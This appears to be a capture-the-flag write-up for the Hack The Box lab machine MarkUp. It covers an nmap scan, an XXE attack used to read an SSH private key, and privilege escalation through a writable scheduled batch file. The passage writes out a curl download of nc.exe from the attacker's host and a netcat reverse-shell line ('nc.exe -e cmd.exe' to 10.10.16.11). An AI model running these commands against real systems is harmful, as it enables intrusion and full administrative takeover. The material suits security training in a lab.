## ------------>> MarkUp <<-------------

// Credential extracted from last machine (included)

    login.sql: Daniel : >SNDv*2wzLWf

// We will start with nmap scan

    $ nmap -sV -A -Pn 10.10.10.49 -p-
    
    Nmap scan report for 10.10.10.49
    Host is up (0.20s latency).
    Not shown: 65532 filtered ports
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
    |   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
    |_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
    80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
    |_http-title: MegaShopping
    443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
    |_http-title: MegaShopping
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    
### --Exploit--

// There is a loging website 

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/1.png)

// Connect with cradentials Daniel : >SNDv*2wzLWf .  We can see in order tab that we can get query request from server

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/2.png)

// we take a look with burpsuite on the request, sent to reapter to furter edit the request

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/3.png)

// Lets check if the site is vulnerable to XXE[XML External Entity]. (Read about [xxe](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) here)

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/4.png)

// Its seems the site is indeed vulnerable to xxe !. We can try extract ssh private key since 22/tcp ssh service open.

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/MarkUp/5.png)

// Its worked !, Now we will save the private key as ssh_daniel_private.key and connect to the server.

    $ ssh -i ssh_daniel_private.key daniel@10.10.10.49

// I had some problems when get some ERROR that requested Daniel's password, to solve that we need
to change the private key permissions.

    $ chmod 600 ssh_daniel_private.key
    $ ssh -i ssh_daniel_private.key daniel@10.10.10.49


// And we have Connection !

    daniel@MARKUP C:\Users\daniel\Desktop>whoami
    markup\daniel

    daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
    032d2fc......................

### ----Privilleges Escalation----

// After some digging in noticed to a file named job.bat in :\Log-Management

    daniel@MARKUP C:\Log-Management>dir
     Volume in drive C has no label.
     Volume Serial Number is 4C8E-E2DC

     Directory of C:\Log-Management

    03/12/2020  03:56 AM    <DIR>          .
    03/12/2020  03:56 AM    <DIR>          ..
    03/06/2020  02:42 AM               346 job.bat
                   1 File(s)            346 bytes
                   2 Dir(s)  13,828,132,864 bytes free



// We can see that all he do its to clear logs

    daniel@MARKUP C:\Log-Management>type job.bat
    @echo off 
    FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
    IF (%adminTest%)==(Access) goto noAdmin
    for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
    echo.
    echo Event Logs have been cleared!
    goto theEnd
    :do_clear
    wevtutil.exe cl %1
    goto :eof
    :noAdmin
    echo You must run this script as an Administrator!
    :theEnd
    exit



// we also can see that group BUILTIN\Users has full control [F] over the file
// those users represent all local users which includes daniel

    daniel@MARKUP C:\Log-Management>icacls job.bat
    job.bat BUILTIN\Users:(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Users:(I)(RX)

    Successfully processed 1 files; Failed processing 0 files



// Deliver netcat to target with python http server

    $ python3 -m http.server 9002


    daniel@MARKUP C:\Log-Management>curl http://10.10.16.11:9002/nc.exe -o c:\users\daniel\nc.exe   
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 59392  100 59392    0     0  59392      0  0:00:01  0:00:01 --:--:-- 44190


// Edit job.bat

    daniel@MARKUP C:\Log-Management>echo C:\Users\daniel\nc.exe -e cmd.exe 10.10.16.11 1444 > C:\Log
    -Management\job.bat


     $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.11] from (UNKNOWN) [10.10.10.49] 49758
    Microsoft Windows [Version 10.0.17763.107]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    markup\administrator

    C:\Users\Administrator\Desktop>type root.txt
    type root.txt
    f574a3e.....................


